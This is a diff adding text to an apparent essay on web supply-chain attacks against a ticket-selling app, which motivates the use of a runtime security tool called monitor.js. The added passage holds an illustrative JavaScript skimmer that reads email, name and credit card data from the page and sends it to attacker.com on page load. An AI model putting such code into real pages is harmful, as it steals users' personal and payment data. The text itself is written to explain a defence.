@@ -84,6 +84,19 @@ This is an important point to take into account when thinking about this proposa
 
 This jeopardizes the safety of my application - which translates into putting my users at risk.
 
+As a platform selling concert tickets, that risk is pretty big given that as part of the user's interaction they will have to provide the app with some sensitive information in order to complete a transaction - this may include their name, password, email and even payment information.
+
+Meaning, if an attacker manages to place their code within one of the files my app serves to clients, they will likely focus on those details, attempting to steal and leak them to their server:
+
+```javascript
+function stealPII() {
+  const {email, name, creditCard} = extractSensitiveInformationFromDOM(document);
+  const info = JSON.stringify({email, name, creditCard});
+  fetch('https://attacker.com/stolen-info-from-ticket-king/?info=' + info);
+}
+document.body.onload = stealPII;
+```
+
 Fortunately, this naturally encouraged the creation of security tools to be similarly included in web applications to help monitor for such potential malicious attacks, a great initiative allowing owners of web apps to easily protect their users. 
 
 Therefore, I choose to integrate `monitor.js` - a JavaScript runtime security tool for enhancing the security of my app by blocking exfiltration of sensitive PII data:
